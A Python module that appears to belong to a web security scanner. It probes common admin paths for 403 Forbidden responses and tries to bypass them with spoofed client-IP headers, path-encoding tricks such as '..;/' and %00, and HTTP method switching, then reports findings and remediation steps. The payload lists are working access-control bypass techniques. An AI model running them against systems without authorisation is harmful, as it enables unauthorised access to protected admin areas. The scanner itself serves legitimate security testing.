"""403 Bypass — techniques to bypass 403 Forbidden responses."""
from __future__ import annotations
import sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
import aiohttp

CVSS = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
CVSS40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"

BYPASS_HEADERS = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Forwarded-Host", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Host", "127.0.0.1"),
    ("X-Original-URL", "/"),
    ("X-Rewrite-URL", "/"),
]

class FourZeroThreeBypass(BaseModule):
    NAME = "403_bypass"
    DESCRIPTION = "403 Bypass: header injection, path traversal, method switching"
    PHASE = 6
    TAGS = ["access-control", "bypass", "cwe-284"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # Get 403 pages from previous modules or use common paths
        forbidden_paths = self.config.extra.get("forbidden_paths", [
            "/admin", "/admin/", "/administrator", "/console",
            "/manager", "/api/admin", "/.htaccess", "/server-status",
        ])

        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False),
            timeout=aiohttp.ClientTimeout(total=8),
        ) as session:
            # First find actual 403 pages
            confirmed_403 = []
            for path in forbidden_paths[:10]:
                await self.rate_limit()
                try:
                    async with session.get(f"{target}{path}") as resp:
                        if resp.status == 403:
                            confirmed_403.append(path)
                except Exception:
                    pass

            if not confirmed_403:
                self.log.info("No 403 pages found to bypass")
                return self._make_result(start)

            bypasses = []

            for path in confirmed_403[:5]:
                url = f"{target}{path}"

                # Technique 1: Header-based bypass
                for header_name, header_value in BYPASS_HEADERS:
                    await self.rate_limit()
                    try:
                        headers = {header_name: header_value}
                        async with session.get(url, headers=headers) as resp:
                            if resp.status == 200:
                                body = await resp.text(errors="ignore")
                                if len(body) > 100:
                                    bypasses.append({
                                        "path": path, "technique": f"Header: {header_name}",
                                        "status": resp.status})
                                    break
                    except Exception:
                        pass

                # Technique 2: Path manipulation
                path_variants = [
                    f"{path}/", f"{path}/.", f"{path}..;/",
                    f"{path}%20", f"{path}%09", f"{path}%00",
                    f"{path}?", f"{path}#", f"{path};",
                    f"/{path.lstrip('/').upper()}",
                    f"{path}/.randomfile",
                ]
                for variant in path_variants:
                    await self.rate_limit()
                    try:
                        async with session.get(f"{target}{variant}") as resp:
                            if resp.status == 200:
                                body = await resp.text(errors="ignore")
                                if len(body) > 100 and "404" not in body[:100].lower():
                                    bypasses.append({
                                        "path": path, "technique": f"Path: {variant}",
                                        "status": resp.status})
                                    break
                    except Exception:
                        pass

                # Technique 3: HTTP method switching
                for method in ["POST", "PUT", "PATCH", "OPTIONS", "TRACE"]:
                    await self.rate_limit()
                    try:
                        async with session.request(method, url) as resp:
                            if resp.status == 200:
                                body = await resp.text(errors="ignore")
                                if len(body) > 100:
                                    bypasses.append({
                                        "path": path, "technique": f"Method: {method}",
                                        "status": resp.status})
                                    break
                    except Exception:
                        pass

            if bypasses:
                ev = Evidence(extra={"bypasses": bypasses[:20]})
                self.new_finding(
                    title=f"403 Bypass — {len(bypasses)} path(s) accessible",
                    severity=Severity.HIGH,
                    description=(
                        f"Successfully bypassed 403 Forbidden on {len(bypasses)} path(s):\n"
                        + "\n".join(f"  {b['path']}: {b['technique']}" for b in bypasses[:10])
                    ),
                    reproduction_steps=[
                        f"curl -H '{bypasses[0]['technique'].split(': ', 1)[-1]}: 127.0.0.1' {target}{bypasses[0]['path']}"
                        if "Header" in bypasses[0]["technique"]
                        else f"curl {target}{bypasses[0]['technique'].split(': ', 1)[-1]}"
                    ],
                    remediation=(
                        "1. Fix access control at application level, not just reverse proxy\n"
                        "2. Normalize paths before access control checks\n"
                        "3. Don't trust X-Forwarded-For for access control\n"
                        "4. Block unexpected HTTP methods"
                    ),
                    references=["CWE-284", "OWASP A01:2021"],
                    evidence=ev, cvss_v31_vector=CVSS, cvss_v40_vector=CVSS40,
                    target=target)

        return self._make_result(start)

class TestFourZeroThreeBypass:
    def test_headers(self) -> None: assert len(BYPASS_HEADERS) >= 5
    def test_phase(self) -> None: assert FourZeroThreeBypass.PHASE == 6
